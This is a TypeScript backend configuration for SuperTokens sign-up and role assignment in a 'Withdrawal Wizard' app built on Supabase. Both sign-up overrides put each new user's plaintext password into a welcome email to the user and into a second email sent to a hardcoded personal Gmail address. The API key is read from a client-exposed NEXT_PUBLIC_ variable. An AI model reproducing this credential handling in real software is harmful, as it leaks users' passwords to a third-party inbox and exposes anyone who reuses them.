import SuperTokens from "supertokens-node";
import EmailPassword, { signUp } from "supertokens-node/recipe/emailpassword";
import SessionNode from "supertokens-node/recipe/session";
import { appInfo } from "./appInfo";
import { TypeInput } from "supertokens-node/types";
import Dashboard from "supertokens-node/recipe/dashboard";
import UserRoles from "supertokens-node/recipe/userroles";
import {
    roleAssignmentEmailTemplate,
    welcomeEmailTemplate,
    welcomeEmailTemplateForInviteUser,
    welcomeEmailTemplateToAdmin,
} from "@/utils/emailTemplate";

import { supabase } from "@/utils/supabaseClient";
import sendMail from "@/utils/emailSender";

export const backendConfig = (): TypeInput => {
    return {
        framework: "custom",
        supertokens: {
            // https://try.supertokens.com is for demo purposes. Replace this with the address of your core instance (sign up on supertokens.com), or self host a core.
            connectionURI: process.env.NEXT_PUBLIC_CONNECTION_URI || "",
            apiKey: process.env.NEXT_PUBLIC_SUPERTOKENS_KEY || "",
        },
        appInfo,
        recipeList: [
            EmailPassword.init({
                signUpFeature: {
                    formFields: [
                        {
                            id: "name",
                        },
                    ],
                },
                override: {
                    apis: (originalImplementation) => {
                        return {
                            ...originalImplementation,
                            signUpPOST: async function (input) {
                                if (
                                    originalImplementation.signUpPOST ===
                                    undefined
                                ) {
                                    throw Error("Should never come here");
                                }

                                // First we call the original implementation of signUpPOST.
                                let response =
                                    await originalImplementation.signUpPOST(
                                        input
                                    );

                                // Post sign up response, we check if it was successful
                                if (response.status === "OK") {
                                    // These are the input form fields values that the user used while signing up
                                    let formFields = input.formFields;
                                    // Extract the custom field value
                                    let nameField = formFields.find(
                                        (field) => field.id === "name"
                                    );
                                    let emailField = formFields.find(
                                        (field) => field.id === "email"
                                    );
                                    let passwordField = formFields.find(
                                        (field) => field.id === "password"
                                    );
                                    let userName = nameField
                                        ? nameField.value
                                        : null;
                                    let userEmail = emailField
                                        ? emailField.value
                                        : null;
                                    let userPassword = passwordField
                                        ? passwordField.value
                                        : null;

                                    const { error } = await supabase
                                        .from("users")
                                        .insert([
                                            {
                                                name: userName,
                                                email: userEmail,
                                                modal_content: "",
                                            },
                                        ]);
                                    if (error) console.error("error", error);
                                    await sendMail({
                                        to: userEmail
                                            ? userEmail
                                            : "abc@example.com",
                                        subject:
                                            "Welcome To The Withdrawal Wizard",
                                        html: welcomeEmailTemplate(
                                            userName || "user",
                                            userEmail || "no-reply@example.com",
                                            userPassword || "NaN"
                                        ),
                                    });
                                    await sendMail({
                                        to: "ncls.chang.gmd@gmail.com",
                                        subject: "New Withdrawal Wizard SignUp",
                                        html: welcomeEmailTemplateToAdmin(
                                            userName || "user",
                                            userEmail || "no-reply@example.com",
                                            userPassword || "NaN"
                                        ),
                                    });
                                }
                                return response;
                            },
                        };
                    },
                    functions: (originalImplementation) => {
                        return {
                            ...originalImplementation,
                            signUp: async function (input) {
                                const response =
                                    await originalImplementation.signUp(input);
                                if (response.status === "OK") {
                                    const { data, error } = await supabase
                                        .from("users")
                                        .select("name")
                                        .eq("email", input.email);
                                    const userName =
                                        data?.length != 0 && data != null
                                            ? data[0].name
                                            : "User";
                                    await sendMail({
                                        to: input.email
                                            ? input.email
                                            : "abc@example.com",
                                        subject:
                                            "Welcome To The Withdrawal Wizard",
                                        html: welcomeEmailTemplate(
                                            userName || "user",
                                            input.email ||
                                                "no-reply@example.com",
                                            input.password || "NaN"
                                        ),
                                    });
                                    await sendMail({
                                        to: "ncls.chang.gmd@gmail.com",
                                        subject: "New Withdrawal Wizard SignUp",
                                        html: welcomeEmailTemplateToAdmin(
                                            userName || "user",
                                            input.email ||
                                                "no-reply@example.com",
                                            input.password || "NaN"
                                        ),
                                    });
                                }
                                return response;
                            },
                        };
                    },
                },
            }),
            Dashboard.init({
                admins: [process.env.NEXT_PUBLIC_ADMIN_EMAIL || ""],
            }),
            UserRoles.init({
                override: {
                    functions: (originalImplementation) => {
                        return {
                            ...originalImplementation,
                            addRoleToUser: async function (input) {
                                const response =
                                    await originalImplementation.addRoleToUser(
                                        input
                                    );
                                if (response.status === "OK") {
                                    const getUserdDetails =
                                        await handleRoleAssignment(
                                            input.userId
                                        );
                                    let userEmail =
                                        getUserdDetails?.loginMethods[0].email;
                                    await sendMail({
                                        to: userEmail
                                            ? userEmail
                                            : "abc@example.com",
                                        subject:
                                            "Welcome To The Withdrawal Wizard",
                                        html: roleAssignmentEmailTemplate(
                                            userEmail || "no-reply@example.com",
                                            input.role
                                        ),
                                    });
                                }
                                return response;
                            },
                        };
                    },
                },
            }),
            SessionNode.init(),
        ],
        isInServerlessEnv: true,
    };
};

let initialized = false;
// This function is used in your APIs to make sure SuperTokens is initialised
export function ensureSuperTokensInit() {
    if (!initialized) {
        SuperTokens.init(backendConfig());
        initialized = true;
    }
}

async function handleRoleAssignment(userId: string) {
    const user = await SuperTokens.getUser(userId);
    return user;
}
